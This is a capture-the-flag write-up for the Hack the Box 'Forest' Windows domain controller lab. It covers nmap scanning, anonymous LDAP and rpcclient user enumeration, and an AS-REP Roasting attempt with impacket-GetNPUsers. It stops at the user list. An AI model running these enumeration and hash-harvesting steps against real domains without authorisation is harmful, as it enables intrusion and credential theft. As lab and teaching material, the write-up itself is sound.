---
Title: Forest HTB
Rating: Easy
OS: Windows
---
# Forest HTB
![Logo](Images/Forest_HTB/forest_logo.png)

*This writeup is for the Forst Hack the Box Machine*

We'll start by enumerating this box using a quick nmap scan running the default scripts:
```bash
└─$ nmap -sC -sV 10.10.10.161 -v -oN nmap_short.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-25 15:00 AWST
Scanning 10.10.10.161 [1000 ports]
---snip---
Discovered open port 53/tcp on 10.10.10.161
Discovered open port 135/tcp on 10.10.10.161
Discovered open port 139/tcp on 10.10.10.161
Discovered open port 445/tcp on 10.10.10.161
Discovered open port 593/tcp on 10.10.10.161
Discovered open port 636/tcp on 10.10.10.161
Discovered open port 389/tcp on 10.10.10.161
Discovered open port 3269/tcp on 10.10.10.161
Discovered open port 3268/tcp on 10.10.10.161
Discovered open port 88/tcp on 10.10.10.161
Discovered open port 5985/tcp on 10.10.10.161
Discovered open port 464/tcp on 10.10.10.161
---snip---
```

The boave shows varios open ports that are associated with Windows Domain services, indicating that this machine is possibly a domain controller
The domain name lookup script from our nmap commnad enumerated the machine to have the net bios name of FOREST, but the domain name of local.htb:
```bash
Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-01-24T23:07:32-08:00
```

The FQDN for the domain shows the forest.htb.local domain. We'll add these additions to our host file to ensure we can perform accurate enumeration. 
`10.10.10.161    htb.local FOREST.htb.local`

I'll start by enumerating the LDAP services as that seems to be the best starting point.
Running the below ldapsearch command produces a slew of information (and confirms that unauthenticated searches are enabled):
`└─$ ldapsearch -x -H ldap://htb.local -b '' >> ldapsearch.txt`

We can extract the logon usernames out of this search result using:
`└─$ ldapsearch -x -H ldap://htb.local -b "dc=htb,dc=local" -s sub "(&(objectclass=user))" sAMAccountName | grep sAMAccountName: | awk -F': ' '{print $2}' >> usernames.txt`


Next We'll use a tool like Rubeus to see if AS-REP Roasting is possible.

AS-REP Roasting is a methodology to scan for user hashes that have Kerberos pre-authenitcation disabled.  
Kerberos pre-auth is a Windows security mechanism that protects against password-guessing attacks. 
It works by responding to an asynchronous server request with a timestamp enabled with the users password hash.
The Keey Distribution Center then validates this hash by confirming the timestamp.

If Pre-authentication is disabled, then the AS-REQ will be directly responded to with the users password hash.
For more information, see the [LDAP WiKi](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication).

We'll audit users that don't require Kerberos Pre-Auth using:
```bash
─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 -k  -usersfile usernames.txt htb.local/ > NoPreAuth.txt
```

*I ran into a dead end here. I back tracked and looked into RPC, used this route to get a list of users*
We'll use `rpcclient` to enumerate users as it seems there's info missing from what I was able to get out of the LDAP records/
```bash
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

